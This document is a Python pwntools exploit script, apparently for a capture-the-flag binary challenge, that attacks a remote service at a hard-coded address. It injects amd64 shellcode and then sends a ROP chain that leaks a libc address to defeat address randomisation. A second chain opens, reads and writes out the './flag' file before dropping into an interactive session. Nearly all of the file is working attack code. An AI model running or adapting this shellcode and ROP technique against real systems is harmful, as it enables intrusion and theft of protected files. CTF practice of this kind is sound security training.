# -*- coding: UTF-8 -*-
from pwn import *
from pwnlib.util.iters import mbruteforce 

#context.log_level = 'debug'
context.terminal = ["/bin/tmux","sp","-h"]
context(arch='amd64',os='linux')
io = remote('43.137.11.211', 7724)
# libc = ELF('./libc-2.31.so')
#io = process('./pwn')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))


shellcode = asm( "movq rsp,xmm2;xor eax,eax;xor edx,edx;mov dl,0x80;mov rsi,r15;push rax;pop rdi;syscall;jmp rdx")
shellcode = asm( '''movq rsp,xmm2
xor rax,rax
push rax
push rax
push rsp
pop rsi
pop rdi
pop rax
syscall
ret
''')

#dbg()
#pause()
sa(' limited bytes!\n',shellcode)
push_rsp = 0x202300a
pop_rsi = 0x202300b
pop_rdi = 0x202300c

rop = p64(0)*2 + p64(pop_rdi) + p64(1) + p64(1) # write
rop += p64(push_rsp) + p64(0) + p64(0) # read
#rop += p64(pop_rsi) + p64(0) + p64(0) # read

sn(rop)

ru('\x7f')
libcbase = l64() - 0x15c0
lg('libcbase')

pay = './flag\x00\x00' + p64(0) 
pay += p64(pop_rsi) + p64(0) + p64(libcbase + 0x1744) +p64(2) # open
pay += p64(pop_rsi) + p64(libcbase + 0x1804) + p64(3) + p64(0) # read
pay += p64(pop_rsi) + p64(libcbase + 0x1804) + p64(1) + p64(1) # write
#pause()
sn(pay)

irt()


